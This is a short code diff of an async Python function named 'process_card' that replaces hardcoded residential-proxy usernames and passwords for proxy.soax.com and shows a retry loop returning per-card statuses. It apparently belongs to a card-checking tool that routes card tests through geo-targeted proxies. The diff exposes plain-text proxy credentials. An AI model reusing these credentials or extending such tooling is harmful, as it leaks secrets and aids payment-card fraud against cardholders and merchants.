@@ -61,8 +61,8 @@ async def process_card(card: str) -> str:
     while retry_count < max_retries:
         try:
             #============[Funcions Need]============#
-            proxy_user = "package-311247-country-mx-region-quintana+roo-city-cancun-isp-telmex+dsl-sessionid-3uB5TQXn4x2ftAey-sessionlength-300"
-            proxy_pass = "2oUB8GoGqXVSn95G"
+            proxy_user = "package-312117-country-mx-isp-altan+redes, s.a.p.i. de c. v."
+            proxy_pass = "szwE7mwH0J5yF983"
             proxy_host = "proxy.soax.com"
             proxy_port = 5000
 
@@ -288,5 +288,6 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
